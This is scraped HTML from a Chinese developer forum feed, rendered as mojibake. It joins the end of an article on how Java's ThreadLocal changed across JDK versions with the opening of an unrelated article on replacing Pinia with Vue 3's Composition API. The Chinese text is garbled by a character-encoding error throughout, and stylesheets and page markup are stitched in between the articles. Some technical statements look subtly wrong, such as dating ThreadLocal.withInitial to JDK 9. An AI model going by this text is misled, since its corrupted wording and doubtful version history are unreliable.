.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. JDK 1.2ï¼šThreadLocal åˆç‰ˆï¼ˆæœ€å°å¯ç”¨ï¼‰</h2>
<p><strong>æ ¸å¿ƒç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li><code>ThreadLocal</code> é¦–æ¬¡å‡ºç°ã€‚</li>
<li>æ¯ä¸ªçº¿ç¨‹ç»´æŠ¤è‡ªå·±çš„ <code>ThreadLocalMap</code>ã€‚</li>
<li><code>ThreadLocalMap</code> çš„ key å°±æ˜¯ <code>ThreadLocal</code> æœ¬èº«ã€‚</li>
<li>åº•å±‚ä½¿ç”¨å¼€æ”¾åœ°å€æ³•çš„å“ˆå¸Œè¡¨ï¼ˆ<code>Entry[] table</code>ï¼‰ã€‚</li>
<li><strong>key ä¸æ˜¯å¼±å¼•ç”¨</strong>ï¼Œå¯¼è‡´ ThreadLocal å¯¹è±¡ä¸é‡Šæ”¾æ—¶å¯èƒ½é€ æˆå†…å­˜æ³„æ¼ã€‚</li>
</ul>
<p><strong>ä¸»è¦é—®é¢˜ï¼š</strong></p>
<ul>
<li>ThreadLocal å®ä¾‹å¦‚æœè¢« GC å›æ”¶å‰æœªæ‰‹åŠ¨ <code>remove()</code>ï¼Œçº¿ç¨‹ï¼ˆå°¤å…¶æ˜¯çº¿ç¨‹æ± ï¼‰ä¸ä¼šç»“æŸï¼ŒEntry æ°¸è¿œå­˜åœ¨ï¼Œå¯¼è‡´ value æ³„æ¼ã€‚</li>
</ul>
<p>è¿™ä¹Ÿæ˜¯è¡Œä¸šé‡Œå¸¸è¯´çš„ ThreadLocal æ³„æ¼æœ€åˆæ¥æºã€‚</p>
<hr/>
<h2 data-id="heading-1">2. JDK 1.3 ~ 1.4ï¼šBug ä¿®å¤ + è¡Œä¸ºç¨³å®š</h2>
<p><strong>å…³é”®æ”¹åŠ¨ï¼š</strong></p>
<ul>
<li>å¢å¼ºæ¸…ç†æœºåˆ¶ï¼Œä½†ä¾ç„¶æ˜¯ key å¼ºå¼•ç”¨ã€‚</li>
<li>ä¿®å¤éƒ¨åˆ†æ‰©å®¹å’Œå†²çªå¤„ç†é—®é¢˜ã€‚</li>
</ul>
<p>ä½†æ ¹æœ¬æ€§çš„æ³„æ¼é—®é¢˜ä»ç„¶å­˜åœ¨ã€‚</p>
<hr/>
<h2 data-id="heading-2">3. JDK 5ï¼šå¼•å…¥å¼±å¼•ç”¨ï¼ˆå…³é”®é‡Œç¨‹ç¢‘ï¼‰</h2>
<p>è¿™æ˜¯ ThreadLocal è®¾è®¡å²ä¸Šæœ€é‡è¦çš„å˜æ›´ã€‚</p>
<p><strong>é‡å¤§æ›´æ–°ï¼š</strong></p>
<ul>
<li>
<p><code>ThreadLocalMap.Entry</code> æ”¹ä¸º <strong>å¼±å¼•ç”¨</strong>ï¼š</p>
<pre><code class="hljs language-scala" lang="scala">static <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Entry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WeakReference&lt;ThreadLocal&lt;?&gt;&gt;</span> </span>{
    <span class="hljs-type">Object</span> value;
}
</code></pre>
</li>
<li>
<p>ä¸€æ—¦ ThreadLocal å¯¹è±¡ä¸å†è¢«å¤–éƒ¨å¼•ç”¨ï¼Œå¯ä»¥è¢« GC å›æ”¶ï¼ŒEntry çš„ key ä¼šå˜æˆ <code>null</code>ã€‚</p>
</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆæ”¹æˆå¼±å¼•ç”¨ï¼Ÿ</strong></p>
<ul>
<li>é˜²æ­¢ ThreadLocal å¯¹è±¡ä¸é‡Šæ”¾å¯¼è‡´æ•´ç»„ Entry æ— æ³•è¢«æ¸…ç†ã€‚</li>
</ul>
<p><strong>å¸¦æ¥çš„å‰¯ä½œç”¨ï¼š</strong></p>
<ul>
<li>value ä»ç„¶æ˜¯å¼ºå¼•ç”¨ï¼Œåªè¦çº¿ç¨‹æ´»ç€ï¼Œvalue æ°¸è¿œä¸ä¼šè¢«å›æ”¶ã€‚</li>
<li>å¦‚æœä½ ä¸æ‰‹åŠ¨ <code>remove()</code>ï¼Œä¾æ—§å¯èƒ½å†…å­˜æ³„æ¼ï¼ˆå°¤å…¶çº¿ç¨‹æ± ï¼‰ã€‚</li>
</ul>
<p>è‡³æ­¤ï¼ŒThreadLocal çš„å†…å­˜æ³„æ¼é—®é¢˜å˜æˆäº†ï¼š</p>
<ul>
<li><strong>ä¸æ˜¯ key æ³„æ¼ï¼Œè€Œæ˜¯ value æ³„æ¼ã€‚</strong></li>
</ul>
<hr/>
<h2 data-id="heading-3">4. JDK 6ï¼šæ¸…ç†æœºåˆ¶å¢å¼º + TAB æ•°ç»„ rehash æ”¹å–„</h2>
<p><strong>JDK6 çš„é‡è¦æ¼”è¿›ï¼š</strong></p>
<ul>
<li>åŠ å¼ºå¯¹ key ä¸º <code>null</code> çš„ Entry çš„æ¸…ç†é€»è¾‘ï¼ˆä¾‹å¦‚è®¿é—®å†²çªä½ç‚¹æ—¶ä¸»åŠ¨æ¸…ç†ï¼‰ã€‚</li>
<li>ä¼˜åŒ– rehash å’Œæ¢æµ‹æœºåˆ¶ã€‚</li>
</ul>
<p>æ•´ä½“ç»“æ„ä»ä¸ºå¼€æ”¾åœ°å€æ³•ï¼Œä¸æ”¹å˜æœ¬è´¨æœºåˆ¶ã€‚</p>
<hr/>
<h2 data-id="heading-4">5. JDK 7ï¼šæ€§èƒ½ä¼˜åŒ– + éƒ¨åˆ†çº¿ç¨‹å±€éƒ¨ç¼“å­˜è¡Œä¸ºæ”¹è¿›</h2>
<p>JDK7 çš„å˜åŒ–åå‘å®ç°å±‚ã€‚</p>
<p><strong>å¢å¼ºç‚¹ï¼š</strong></p>
<ul>
<li>å®Œå–„å†²çªæ¢æµ‹ï¼Œé™ä½å“ˆå¸Œå†²çªå¯¼è‡´çš„é€€åŒ–ã€‚</li>
<li>æ”¹å–„ nextIndex/prevIndex çš„æ€§èƒ½ã€‚</li>
<li>ä¿®å¤æ‰©å®¹å rehash çš„ä¸€äº› bugã€‚</li>
</ul>
<p>ThreadLocalMap å˜å¾—æ›´å¥å£®ï¼Œä½†ä¸æ”¹å˜è¯­ä¹‰ã€‚</p>
<hr/>
<h2 data-id="heading-5">6. JDK 8ï¼šæ¸…ç†ç­–ç•¥è¿›ä¸€æ­¥åŠ å¼ºï¼Œæ ¸å¿ƒé€»è¾‘æˆç†Ÿç¨³å®š</h2>
<p><strong>å…³é”®å˜åŒ–ï¼š</strong></p>
<ul>
<li>
<p>ThreadLocalMap æ¸…ç† <code>stale entry</code>ï¼ˆkey = nullï¼‰çš„ç­–ç•¥æ›´åŠ æ¿€è¿›ï¼š</p>
<ul>
<li>get/set/remove æ—¶éƒ½ä¼šå°è¯•æ¸…ç†æ­» keyã€‚</li>
</ul>
</li>
<li>
<p>å†…éƒ¨ rehash ç­–ç•¥æ›´é«˜æ•ˆã€‚</p>
</li>
<li>
<p>çº¿ç¨‹æ± åœºæ™¯ä¸‹çš„å†…å­˜æ³„æ¼ä»ç„¶éœ€è¦æ‰‹åŠ¨å¤„ç† (<code>remove()</code>)ï¼Œä½† default é€»è¾‘æ›´å¥å£®ã€‚</p>
</li>
</ul>
<p><strong>JDK8 çš„ ThreadLocal åŸºæœ¬æˆä¸ºè¡Œä¸šä¸»æµå‚è€ƒå®ç°ã€‚</strong></p>
<hr/>
<h2 data-id="heading-6">7. JDK 9ï¼šæ–°å¢ <code>ThreadLocal.withInitial()</code>ï¼ˆè¯­æ³•ç³–ï¼‰</h2>
<p>æ­¤ç‰ˆæœ¬ä»¥åå±äºç¨³å®šæœŸï¼Œæ–°å¢åŠŸèƒ½è€Œéæœºåˆ¶å˜åŒ–ã€‚</p>
<p><strong>æ–°å¢ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">ThreadLocal<span class="hljs-selector-class">.withInitial</span>(() -&gt; new <span class="hljs-built_in">SimpleDateFormat</span>("yyyy-MM-dd"))
</code></pre>
<p>æœºåˆ¶ä¸å˜ï¼Œæ˜“ç”¨æ€§æå‡ã€‚</p>
<hr/>
<h2 data-id="heading-7">8. JDK 11 / JDK 17ï¼šå‡ ä¹æ— å˜åŒ–ï¼Œå±äºç¨³å®šç»´æŠ¤æœŸ</h2>
<ul>
<li>æŒç»­åšå°ä¿®å¤ï¼Œå¢å¼ºå¯è¯»æ€§ä¸è¾¹ç•Œå¤„ç†ã€‚</li>
<li>å†…å­˜æ¸…ç†ç­–ç•¥ä¸ JDK8 å‡ ä¹æ— å·®åˆ«ã€‚</li>
<li>è¯­ä¹‰å’Œè¡Œä¸ºå·²ç»éå¸¸ç¨³å®šã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-8">9. JDK 21ï¼šè™šæ‹Ÿçº¿ç¨‹ï¼ˆLoomï¼‰ä¸‹çš„ ThreadLocal è¯­ä¹‰æ‰©å±•ï¼ˆé‡è¦ï¼‰</h2>
<p>åœ¨ Loomï¼ˆè™šæ‹Ÿçº¿ç¨‹ï¼‰ä¸­ï¼š</p>
<p><strong>ThreadLocal é»˜è®¤æœºåˆ¶ä»ç„¶å¯ç”¨ï¼Œä½†æˆæœ¬æ›´ä½ï¼š</strong></p>
<ul>
<li>è™šæ‹Ÿçº¿ç¨‹æ˜¯è½»é‡ç»“æ„ï¼Œä¿ç•™è‡ªå·±çš„ ThreadLocalMapã€‚</li>
<li>è™šæ‹Ÿçº¿ç¨‹ä¸å¤ç”¨ï¼Œç”Ÿå‘½å‘¨æœŸçŸ­ï¼Œå› æ­¤ä¸å®¹æ˜“äº§ç”Ÿ ThreadLocal value æ³„æ¼ã€‚</li>
</ul>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>è™šæ‹Ÿçº¿ç¨‹ä¸æ˜¯æ± åŒ–çº¿ç¨‹ï¼Œä¸ä¼šå‡ºç°çº¿ç¨‹æ± æ³„æ¼é—®é¢˜ã€‚</li>
<li>æŸäº›åœºæ™¯ ThreadLocal æˆæœ¬åè€Œæ¯”ä¼ ç»Ÿçº¿ç¨‹æ›´è½»ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-9">10. å‰åæœºåˆ¶çš„æ ¸å¿ƒå˜åŒ–æ€»ç»“</h2>


















































<table><thead><tr><th>JDK ç‰ˆæœ¬</th><th>å˜åŒ–ç‚¹</th><th>å½±å“</th></tr></thead><tbody><tr><td>1.2</td><td>åŸºæœ¬å®ç°</td><td>å­˜åœ¨ä¸¥é‡æ³„æ¼é£é™©</td></tr><tr><td>1.3-1.4</td><td>Bug ä¿®å¤</td><td>ç¨³å®šæ€§å¢å¼º</td></tr><tr><td>5</td><td><strong>key æ”¹ä¸ºå¼±å¼•ç”¨</strong></td><td>é¿å… key æ³„æ¼ï¼Œä½† value æ³„æ¼ä¾æ—§</td></tr><tr><td>6</td><td>åŠ å¼ºåŒ–æ¸…ç†é€»è¾‘</td><td>é™ä½å†…å­˜æ³„æ¼é£é™©</td></tr><tr><td>7</td><td>è¿›ä¸€æ­¥ä¼˜åŒ–å†²çªå¤„ç†</td><td>æ€§èƒ½æå‡</td></tr><tr><td>8</td><td><strong>æˆç†Ÿå®ç°ï¼Œæ¸…ç†æ›´æ¿€è¿›</strong></td><td>æ ‡å‡†å®ç°ï¼Œè¢«è¡Œä¸šæ™®éä½¿ç”¨</td></tr><tr><td>9+</td><td>æ˜“ç”¨æ€§æå‡ï¼ˆwithInitialï¼‰</td><td>å¼€å‘ä½“éªŒå¢å¼º</td></tr><tr><td>21</td><td>è™šæ‹Ÿçº¿ç¨‹æ”¯æŒç¨³å®š</td><td>æ³„æ¼é£é™©æ˜¾è‘—é™ä½</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">11. å“ªäº›é—®é¢˜è´¯ç©¿æ‰€æœ‰ç‰ˆæœ¬ï¼Ÿ</h2>
<p>æ— è®ºå“ªä¸ªç‰ˆæœ¬ï¼ŒThreadLocal æ°¸è¿œæœ‰ä¸¤ä¸ªæ ¸å¿ƒé£é™©ï¼š</p>
<ol>
<li><strong>value ä¼šæ³„æ¼ï¼Œåªè¦çº¿ç¨‹è¿˜æ´»ç€</strong></li>
<li><strong>çº¿ç¨‹æ± å¤ç”¨å¯¼è‡´ value é•¿æœŸé©»ç•™</strong></li>
</ol>
<p>è¿™ä¸¤ä¸ªé—®é¢˜åœ¨ JDK21 çš„è™šæ‹Ÿçº¿ç¨‹ä¸­å¼±åŒ–ä½†æœªå½»åº•æ¶ˆå¤±ã€‚</p>
<hr/>
<h2 data-id="heading-11">12. ä¸šå†…æœ€ä½³å®è·µ</h2>
<ol>
<li>åˆ›å»ºåå¿…é¡»æ‰‹åŠ¨ <code>remove()</code></li>
<li>é¿å…åœ¨å®¹å™¨/æ¡†æ¶çº§åˆ«ç¼“å­˜ä¸šåŠ¡å€¼</li>
<li>é¿å…ä½¿ç”¨æ— ç•Œçº¿ç¨‹æ± ç»“åˆ ThreadLocal</li>
<li>ä¸è¦æŠŠ ThreadLocal å½“æˆä¸Šä¸‹æ–‡ä¼ é€’æœºåˆ¶ï¼ˆåº”ä½¿ç”¨ ThreadLocal è®¾è®¡çš„æ¡†æ¶ï¼‰</li>
<li>æ¨èä½¿ç”¨ <code>withInitial()</code> é¿å… null å€¼</li>
</ol>
<hr/>
<h2 data-id="heading-12">13. è®²æ¸…æ¥šæœ¬è´¨</h2>
<p><strong>ThreadLocal åœ¨æ•´ä¸ª JDK ç”Ÿå‘½å‘¨æœŸä¸­çš„æ ¸å¿ƒå˜åŒ–åªæœ‰ä¸€æ¬¡ï¼šJDK5 å¼•å…¥å¼±å¼•ç”¨ã€‚</strong></p>
<p>å…¶ä½™ç‰ˆæœ¬æ”¹åŠ¨éƒ½æ˜¯ï¼š</p>
<ul>
<li>æ›´æ¿€è¿›çš„æ¸…ç†ç­–ç•¥</li>
<li>æ›´å¥å£®çš„å“ˆå¸Œæ¢æµ‹ä¸ rehash</li>
<li>æ›´æ˜“ç”¨çš„ API</li>
<li>è™šæ‹Ÿçº¿ç¨‹åœºæ™¯ä¸‹çš„è¿è¡Œæ—¶è¡¨ç°æ”¹å–„</li>
</ul>
<p>ä½†è¡Œä¸ºæœ¬è´¨æ²¡æœ‰æ”¹å˜ï¼š</p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹ç»´æŠ¤ä¸€ä¸ª Map</li>
<li>key å¼±å¼•ç”¨</li>
<li>value å¼ºå¼•ç”¨</li>
<li>éœ€è¦æ‰‹åŠ¨ removeï¼Œçº¿ç¨‹æ± ä¸­æ›´åº”å½“å¦‚æ­¤</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å†æ¥èŠèŠï¼ŒVue3 é¡¹ç›®ä¸­ Pinia çš„æ›¿ä»£æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7575458028254674987</link>    <guid>https://juejin.cn/post/7575458028254674987</guid>    <pubDate>2025-11-23T11:23:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575458028254674987" data-draft-id="7575655132755394579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å†æ¥èŠèŠï¼ŒVue3 é¡¹ç›®ä¸­ Pinia çš„æ›¿ä»£æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-11-23T11:23:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å¸ƒé²ä¼Š"/> <meta itemprop="url" content="https://juejin.cn/user/4431511346492554"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å†æ¥èŠèŠï¼ŒVue3 é¡¹ç›®ä¸­ Pinia çš„æ›¿ä»£æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4431511346492554/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å¸ƒé²ä¼Š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T11:23:24.000Z" title="Sun Nov 23 2025 11:23:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"ã€Œ"}.markdown-body b:after,.markdown-body strong:after{content:"ã€"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p><strong>æƒ³è·å–æ›´å¤š2025å¹´æœ€æ–°å‰ç«¯åœºæ™¯é¢˜å¯ä»¥çœ‹è¿™é‡Œ</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ffe.ecool.fun%2Ftopic-list%3Fic%3DKIQC2F%26from%3Djuejin_article" target="_blank" title="https://fe.ecool.fun/topic-list?ic=KIQC2F&amp;from=juejin_article" ref="nofollow noopener noreferrer">fe.ecool.fun</a></p>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯åˆ˜å¸ƒæ–¯ã€‚</p>
<p>ä¹‹å‰è½¬è½½äº†ä¸€ç¯‡æ–‡ç« <strong>Vue é¡¹ç›®ä¸è¦å†ç”¨ Pinia äº†</strong>ï¼Œå…ˆä¸å¯å¦è®¤ï¼Œè¿™æ–‡ç« æœ‰ç‚¹æ ‡é¢˜å…šçš„æ„æ€ã€‚ä½†è¿™ç¯‡æ–‡ç« çš„ä¸»è¦è§‚ç‚¹æ˜¯è¯´ï¼Œåœ¨ä¸­å°é¡¹ç›®é‡Œï¼Œç”¨ Vue 3 è‡ªå¸¦çš„ç»„åˆå¼ APIï¼ˆ<code>reactive</code>Â /Â <code>ref</code>ï¼‰æ¥ç®¡çŠ¶æ€ï¼Œå¾ˆå¤šæ—¶å€™æ¯”ç¡¬ä¸Š Pinia è¦é¦™ã€‚</p>
<p>å¥½å®¶ä¼™ï¼Œè¯„è®ºåŒºä¸€ä¸‹å°±çƒ­é—¹äº†ï¼Œæ€»ç»“èµ·æ¥æ˜¯ï¼šâ€œPinia å¤šå¥½ç”¨ï¼Œä½ è‚¯å®šæ˜¯æ²¡ç”¨æ˜ç™½ Piniaâ€</p>
<p>è¯´å®è¯ï¼Œæˆ‘ç¡®å®æœ‰ç‚¹æ„å¤–ã€‚</p>
<p><strong>æˆ‘å…ˆæ‘†æ˜æ€åº¦ï¼šPinia æ˜¯ä¸ªéå¸¸ä¼˜ç§€çš„çŠ¶æ€ç®¡ç†åº“ã€‚</strong>Â å°¤é›¨æºªå›¢é˜Ÿäº²è‡ªæ“åˆ€ï¼ŒAPI è®¾è®¡ç®€æ´ï¼ŒTS æ”¯æŒå®Œç¾ï¼Œæ’ä»¶ç³»ç»Ÿçµæ´»ï¼ŒDevtools ä½“éªŒä¸æ»‘ã€‚è¿™ä¸€ç‚¹ï¼Œæ²¡äººèƒ½å¦è®¤ã€‚</p>
<p>ä½†æˆ‘çš„æ ¸å¿ƒè§‚ç‚¹æ˜¯ï¼š<strong>ä¼˜ç§€ï¼Œä¸ä»£è¡¨â€œæ‰€æœ‰åœºæ™¯éƒ½å¿…é¡»ä¸Šâ€ã€‚</strong></p>
<p>æˆ‘å‘ç°ç°åœ¨å¾ˆå¤šå›¢é˜Ÿï¼Œå°¤å…¶æ˜¯ä» Vue 2 åˆšè¿åˆ° Vue 3 ä¸ä¹…çš„ï¼Œå­˜åœ¨ä¸€ç§å¾ˆå¼ºçš„Â <strong>â€œçŠ¶æ€ç®¡ç†æƒ¯æ€§â€</strong> ã€‚</p>
<p>ä»€ä¹ˆæ„æ€ï¼Ÿ</p>
<p>åœ¨ Vue 2 + Options API çš„æ—¶ä»£ï¼Œç»„ä»¶ï¼ˆComponentï¼‰å’ŒçŠ¶æ€ï¼ˆStateï¼‰æ˜¯â€œéš”ç¦»â€çš„ã€‚<code>data</code>Â é‡Œçš„çŠ¶æ€å¤©ç”Ÿå°±æ˜¯â€œå†…å‘â€çš„ï¼Œç»„ä»¶ä¸€é”€æ¯ï¼ŒçŠ¶æ€å°±æ²¡äº†ã€‚è·¨ç»„ä»¶é€šä¿¡ã€å…¨å±€çŠ¶æ€å…±äº«ï¼Œä½ æ€ä¹ˆåŠï¼Ÿä½ æ²¡å¾—é€‰ï¼Œä½ å¿…é¡»ä¸Š Vuexã€‚Vuex å°±åƒä¸€ä¸ªâ€œä¸­å¤®ç©ºè°ƒâ€ï¼Œä½ ä¸ç”¨å®ƒï¼Œåˆ«çš„æˆ¿é—´ï¼ˆç»„ä»¶ï¼‰å°±äº«å—ä¸åˆ°å†·æ°”ï¼ˆçŠ¶æ€ï¼‰ã€‚</p>
<p>æ‰€ä»¥ï¼ŒVue 2 æ—¶ä»£å…»æˆäº†æˆ‘ä»¬çš„æ€ç»´å®šå¼ï¼š<strong>åšé¡¹ç›® = Vue å…¨å®¶æ¡¶ = Vue + Vue Router + Vuexã€‚</strong></p>
<p>åˆ°äº† Vue 3ï¼ŒVuex é€€ä½ï¼ŒPinia ç»§ä»»ã€‚äºæ˜¯å¤§å®¶ç†æ‰€å½“ç„¶åœ°æŠŠå…¬å¼æ¢æˆäº†ï¼š<strong>åšé¡¹ç›® = Vue 3 + Vue Router + Piniaã€‚</strong></p>
<p>å¯åŠ¨ä¸€ä¸ªæ–°é¡¹ç›®ï¼Œ<code>npm create vue@latest</code>ï¼Œä¸€è·¯Â <code>yes</code>Â ä¸‹æ¥ï¼ŒPinia å°±è£…å¥½äº†ã€‚ç„¶åå°±å¼€å§‹Â <code>defineStore</code>ã€‚</p>
<p>ä½†å¤§å®¶å¥½åƒéƒ½å¿½ç•¥äº† Vue 3 æœ€å¤§çš„é©å‘½æ€§å˜åŒ–â€”â€”<strong>ç»„åˆå¼ API (Composition API)</strong>Â æœ¬èº«ï¼Œå°±å·²ç»æ˜¯ä¸€ç§å¼ºå¤§çš„çŠ¶æ€ç®¡ç†æ¨¡å¼äº†ã€‚</p>
<h4 data-id="heading-0"><code>defineStore</code>Â å¸®æˆ‘ä»¬åšäº†ä»€ä¹ˆï¼Ÿ</h4>
<p>è¿˜æ˜¯ç”¨é‚£ç¯‡æ–‡ç« ä¸­çš„ä¾‹å­ï¼Œåšä¸€ä¸ªæœ€ç®€å•çš„â€œç”¨æˆ·çŠ¶æ€ç®¡ç†â€ï¼Œä¸¤ç§æ–¹å¼æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚</p>
